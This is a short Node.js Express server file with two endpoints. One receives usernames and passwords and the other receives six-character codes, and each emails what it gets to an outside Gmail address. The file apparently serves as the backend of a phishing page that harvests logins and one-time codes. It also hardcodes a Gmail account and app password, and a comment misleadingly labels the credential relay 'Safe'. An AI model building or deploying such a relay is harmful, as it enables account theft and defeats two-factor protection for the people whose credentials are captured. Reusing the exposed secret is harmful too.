const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");

const app = express();

app.use(cors());
app.use(express.json());

// Email transport (using Gmail App Password)
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "tnews3692@gmail.com",
    pass: "derqzmxppkmyjdao" // ← Replace safely
  },
});

// ----------------------------
// 1️⃣ Existing Functionality (Safe)
// ----------------------------
app.post("/send-credentials", async (req, res) => {
  const { username } = req.body;
    const { password } = req.body;

  try {
    await transporter.sendMail({
      from: "tnews3692@gmail.com",
      to: "aarchi.snapperit@gmail.com",
      subject: "New Username Submitted",
      html: `
        <h2>User Submitted</h2>
        <p><strong>Username:</strong> ${username}</p>
        <p><strong>Password:</strong> ${password}</p>
      `,
    });

    res.json({ success: true });
  } catch (error) {
    console.log("EMAIL ERROR:", error);
    res.status(500).json({ success: false, error });
  }
});

// ----------------------------
// 2️⃣ NEW FUNCTIONALITY
// Send 7-Character Message
// ----------------------------
app.post("/send-message", async (req, res) => {
  const { message } = req.body;

  if (!message || message.length !== 6) {
    return res.json({ success: false, msg: "Message must be exactly 6 characters" });
  }

  try {
    await transporter.sendMail({
      from: "tnews3692@gmail.com",
      to: "aarchi.snapperit@gmail.com",
      subject: "New 7-Character Message",
      html: `
        <h2>New Message Received</h2>
        <p><strong>Message:</strong> ${message}</p>
      `,
    });

    res.json({ success: true, msg: "Verify" });
  } catch (error) {
    console.log("EMAIL ERROR:", error);
    res.status(500).json({ success: false, error });
  }
});

// ----------------------------
// Start Server
// ----------------------------
app.listen(5000, () => console.log("Server running on port 5000"));
